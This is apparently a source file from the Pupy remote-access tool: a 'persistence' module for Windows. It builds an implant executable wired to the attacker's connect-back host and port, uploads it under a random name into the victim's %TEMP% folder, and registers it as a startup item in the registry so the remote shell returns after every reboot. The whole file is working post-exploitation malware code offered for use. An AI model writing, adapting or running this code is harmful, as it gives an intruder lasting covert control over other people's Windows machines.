# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import random
import pupygen
import os.path
import string

__class_name__="PersistenceModule"

class PersistenceModule(PupyModule):
	""" Enables persistence via registry keys """
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
		self.arg_parser.add_argument('-m','--method', choices=['registry'], required=True, help='persistence method')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		if args.method=="registry":
			self.client.load_package("pupwinutils.persistence")

			#retrieving conn info
			res=self.client.conn.modules['pupy'].get_connect_back_host()
			host, port=res.rsplit(':',1)

			self.info("generating exe ...")
			#generating exe
			if self.client.desc['proc_arch']=="64bit":
				exebuff=pupygen.get_edit_pupyx64_exe(host, port)
			else:
				exebuff=pupygen.get_edit_pupyx86_exe(host, port)

			remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
			self.info("uploading to %s ..."%remote_path)
			#uploading
			rf=self.client.conn.builtin.open(remote_path, "wb")
			chunk_size=16000
			pos=0
			while True:
				buf=exebuff[pos:pos+chunk_size]
				if not buf:
					break
				rf.write(buf)
				pos+=chunk_size
			rf.close()
			self.success("upload successful")

			#adding persistency
			self.info("adding to registry ...")
			self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(remote_path)
			self.info("registry key added")

			self.success("persistence added !")
		else:
			self.error("not implemented")

